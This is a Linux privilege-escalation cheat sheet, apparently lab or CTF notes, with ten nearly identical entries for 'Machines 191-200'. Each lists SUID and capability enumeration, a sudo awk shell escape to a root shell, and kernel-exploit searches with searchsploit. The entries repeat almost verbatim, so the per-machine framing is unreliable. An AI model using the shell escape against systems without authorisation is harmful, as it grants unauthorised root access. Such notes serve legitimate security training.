
# Privilege Escalation for Machines 191-200

## Machine 191
- Enumeration:
    - sudo -l: Check sudo permissions for the user.
    - find / -perm -4000 -type f 2>/dev/null: Find SUID binaries across the system.
    - getcap -r / 2>/dev/null: Look for Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # If awk has NOPASSWD
    - Kernel Exploits: searchsploit linux kernel 5.4.0  # Search for potential kernel exploits

## Machine 192
- Enumeration:
    - sudo -l: Check sudo permissions for the user.
    - find / -perm -4000 -type f 2>/dev/null: Find SUID binaries across the system.
    - getcap -r / 2>/dev/null: Look for Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # If awk has NOPASSWD
    - Kernel Exploits: uname -a  # Check the kernel version
    - Searchsploit for specific kernel vulnerabilities

## Machine 193
- Enumeration:
    - sudo -l: Check sudo permissions for the user.
    - find / -perm -4000 -type f 2>/dev/null: Look for binaries with SUID set.
    - getcap -r / 2>/dev/null: Examine Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # Exploit if awk is in NOPASSWD list
    - Kernel Exploits: uname -a  # Check the kernel version
    - Exploit with searchsploit for vulnerable kernel

## Machine 194
- Enumeration:
    - sudo -l: Check sudo permissions for the user.
    - find / -perm -4000 -type f 2>/dev/null: Search for binaries with SUID.
    - getcap -r / 2>/dev/null: Investigate Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # If awk is NOPASSWD
    - Kernel Exploits: uname -a  # Identify kernel version
    - Searchsploit for kernel vulnerabilities

## Machine 195
- Enumeration:
    - sudo -l: Review sudo privileges for the user.
    - find / -perm -4000 -type f 2>/dev/null: List files with SUID bits.
    - getcap -r / 2>/dev/null: Check for Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # Exploit if awk is NOPASSWD
    - Kernel Exploits: uname -a  # Kernel version information
    - Use searchsploit for kernel vulnerabilities

## Machine 196
- Enumeration:
    - sudo -l: Identify sudo permissions.
    - find / -perm -4000 -type f 2>/dev/null: Locate SUID binaries.
    - getcap -r / 2>/dev/null: Check Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # If awk is NOPASSWD
    - Kernel Exploits: uname -a  # Kernel version check
    - Kernel Exploit search via searchsploit

## Machine 197
- Enumeration:
    - sudo -l: Review sudo permissions.
    - find / -perm -4000 -type f 2>/dev/null: Search for SUID binaries.
    - getcap -r / 2>/dev/null: Look for Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # If awk has NOPASSWD
    - Kernel Exploits: uname -a  # Check kernel version
    - Searchsploit for kernel vulnerabilities

## Machine 198
- Enumeration:
    - sudo -l: Check sudo access.
    - find / -perm -4000 -type f 2>/dev/null: Identify files with SUID.
    - getcap -r / 2>/dev/null: Check Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # Exploit if awk is in NOPASSWD
    - Kernel Exploits: uname -a  # Get kernel version information
    - Use searchsploit for kernel-specific exploits

## Machine 199
- Enumeration:
    - sudo -l: Check sudo privileges.
    - find / -perm -4000 -type f 2>/dev/null: Search for SUID binaries.
    - getcap -r / 2>/dev/null: Look for Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # Exploit with NOPASSWD
    - Kernel Exploits: uname -a  # Kernel version check
    - Kernel exploits via searchsploit

## Machine 200
- Enumeration:
    - sudo -l: Review sudo permissions.
    - find / -perm -4000 -type f 2>/dev/null: Check for SUID binaries.
    - getcap -r / 2>/dev/null: Investigate Linux capabilities.

- Exploitation:
    - Sudo Abuse: sudo awk 'BEGIN {system("/bin/sh")}'  # Exploit with NOPASSWD
    - Kernel Exploits: uname -a  # Check kernel version
    - Use searchsploit for kernel exploit

